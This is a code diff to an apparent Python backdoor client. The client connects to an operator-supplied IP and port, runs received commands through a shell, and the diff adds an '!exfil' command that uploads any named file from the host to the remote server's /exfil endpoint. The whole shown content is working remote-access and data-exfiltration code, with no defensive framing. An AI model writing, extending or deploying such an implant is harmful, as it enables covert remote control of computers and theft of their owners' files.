@@ -6,6 +6,7 @@ import argparse
 import requests
 import subprocess
 import time
+import os
 
 parser = argparse.ArgumentParser()
 parser.add_argument("ip", help="The IP address to connect to.")
@@ -30,6 +31,24 @@ def hook():
 
 		if "!quit" in cmd:
 			break
+
+		elif "!exfil" in cmd:
+			exfil,filename = cmd.split("!exfil ")
+			if os.path.exists(filename):
+				if args.port == 80:
+					url = 'http://' + args.ip + '/exfil'
+				else:
+					url = 'http://' + args.ip + ':' + args.port + '/exfil'
+
+				files = {'file': open(filename, 'rb')}
+				r = requests.post(url, files=files, data={'filename':filename})
+			else:
+				if args.port == 80:
+					url = 'http://' + args.ip
+				else:
+					url = 'http://' + args.ip + ':' + args.port
+
+				post_response = requests.post(url=url, data='!FILE_NOT_FOUND')
 
 		else:
 			CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
